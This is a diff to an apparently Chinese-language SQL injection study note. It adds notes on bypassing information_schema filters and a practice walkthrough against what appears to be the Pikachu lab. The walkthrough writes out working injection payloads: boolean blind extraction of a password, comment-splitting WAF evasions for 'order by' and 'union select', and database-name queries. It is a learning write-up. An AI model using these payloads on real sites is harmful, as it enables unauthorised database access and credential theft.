@@ -541,9 +541,9 @@ and(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()
 /*!union*//*!00000all*//*!00000select*/1,2
 ```
 
+### 2.27 information_schema绕过
 
-
-
+使用`sys.schema_auto_increment_columns`、`mysql.innodb_table_stats`和`mysql.innodb_table_index`绕过
 
 ## 3. sqli-labs通关
 
@@ -1579,3 +1579,77 @@ else
 ### 3.6 总结
 
 终于是刷完了，总体来说把每种注入方式都练习了个遍，并学习了一些绕过手法，整个过程除了`Less-1`跟着大佬把`sqlmap`使用熟悉了一下，其余均为手注，加强自己的能力，尽量不变成离了脚本就活不了的脚本小子（）。但是其实还有许多利用手法没有学到，以后遇到就在本文填补，避免做完就忘了。
+
+
+
+## 4 SQL注入绕过小实战
+
+```sql
+?name=vince'
+# You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''vince''' at line 1
+```
+
+可以看见是存在sql注入的
+
+```sql
+?name=vince'and+1=1--+
+```
+
+![image-20250319223257723](sql注入/image-20250319223257723.png)
+
+```sql
+?name=vince'and+0x2!=1--+
+# your uid:1
+your email is: vince@pikachu.com
+```
+
+成功绕过
+
+```sql
+?name=vince'and+substr(user()+from+1+for+1)--+
+```
+
+被拦截，尝试使用布尔绕过
+
+```bash
+?name=vince'and+0x31!=if((substr((select+password+from+`users`+limit+1)from+1+for+1)='a'),0x31,0)--+  # 回显
+?name=vince'and+0x31!=if((substr((select+password+from+`users`+limit+1)from+1+for+1)='e'),0x31,0)--+  # 不回显
+```
+
+尝试联合注入
+
+```sql
+?name=vince'order+by+1--+ # 被拦截
+?name=vince'order/**/by+1--+ # 被拦截
+?name=vince'order/*//*/by+1--+  # 成功绕过
+
+?name=vince'order/*//*/by+2--+	# 回显
+?name=vince'order/*//*/by+3--+	# 无回显
+```
+
+因此这里只有两个字段
+
+```sql
+?name=vince'union+select+1,2--+	# 被拦截
+?name=vince'union/*//*/select+1,2--+	# 被拦截
+?name=vince'union/*////*/select+1,2--+	# 被拦截
+?name=vince'union/*//--+//*/select+1,2--+	# 成功绕过
+```
+
+查数据库名
+
+```sql
+?name=vince'union/*//--+//*/select+1,(select+concat(schema_name)+from+information_schema.schemata)--+	# 被拦截
+?name=vince'union/*//--+//*/select+1,(database/*//--+//*/())--+	# 成功绕过
+# myp1
+```
+
+查表名
+
+```sql
+?name=vince'union/*//--+//*/select+1,(select+concat(table_name)+from+information_schema.tables+where+table_schema=`myp1`)--+	# 被拦截
+```
+
+经过测试过滤了`information_schema`，尝试使用`sys.schema_auto_increment_columns`、`mysql.innodb_table_stats`和`mysql.innodb_table_index`都绕过无果。（其实绕过了，但是查询权限不足`﻿SELECT command denied to user 'myp1'@'localhost' for table 'x$schema_table_statistics_with_buffer'`）
+
+尝试双写和编码都绕过了，也没权限，应该确实没办法了
